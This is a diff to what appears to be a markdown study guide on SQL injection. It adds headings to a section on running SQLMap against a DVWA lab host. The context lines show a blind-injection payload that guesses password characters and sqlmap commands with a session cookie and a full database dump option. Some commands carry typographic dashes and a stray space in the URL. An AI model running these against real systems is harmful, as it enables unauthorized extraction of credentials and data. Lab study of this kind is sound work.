@@ -773,6 +773,7 @@ grant alter table to UnauthorizedUser
 	- To find second character of password: `tom' and substring(password, 2, 1)='a`
 
 ## SQLMap
+### Automated SQL Injections
 > **About SQLMap**
 > SQLMap is an automated SQL injection tool
 
@@ -810,8 +811,10 @@ sudo sqlmap -u "http//Win10-IP/dvwa-master/vulnerabilties/sqli/?id=3&Submit=Subm
 
 12. Run SQLmap with target URL and cookie again with `-D` and `--dump-all` option 
 	- `-D` option -> specifies name of database (`dvwa` database)
-	- `--dump-all` -> specify to dump all contents of
+	- `--dump-all` -> specify to dump all contents of every table
 
 ```
 sudo sqlmap –u "http://192.168.13.100/dvwa-master/vulnerabilities /sqli/?id=3&Submit=Submit" --cookie="security=low; PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" –D dvwa --dump-all
 ```
+
+### Automated Blind SQL Injection
